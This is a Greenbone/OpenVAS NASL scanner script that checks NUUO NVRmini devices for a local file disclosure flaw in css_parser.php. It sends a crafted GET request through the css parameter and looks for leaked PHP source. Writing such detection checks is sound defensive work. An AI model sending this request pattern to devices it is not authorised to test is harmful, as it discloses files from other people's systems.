CPE = "cpe:/a:nuuo:nuuo";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.107043" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2016-08-24 16:42:51 +0200 (Wed, 24 Aug 2016)" );
	script_name( "NUUO NVRmini 2 3.0.8 - Local File Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_nuuo_devices_web_detect.sc" );
	script_require_ports( "Services/www", 80, 443 );
	script_mandatory_keys( "nuuo/web/detected" );
	script_xref( name: "URL", value: "https://cxsecurity.com/issue/WLB-2016080065" );
	script_xref( name: "URL", value: "http://www.nuuo.com" );
	script_tag( name: "summary", value: "This host is running NUUO NVRmini and is affected by a local file disclosure vulnerability." );
	script_tag( name: "vuldetect", value: "This check tries to disclose a local file content by sending a crafted HTTP GET request" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "insight", value: "The vulnerability is due to improper verification of input passed through the css parameter to css_parser.php script." );
	script_tag( name: "affected", value: "Versions 2.3.0.8 and below." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to disclose contents of files." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!http_port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "css_parser.php?css=css_parser.php";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<\\?php", extra_check: "/* please use an absolute address for your css /*" )){
	report = "It was possible to disclose the content of css_parser.php file.\n\n";
	report += http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}
exit( 0 );

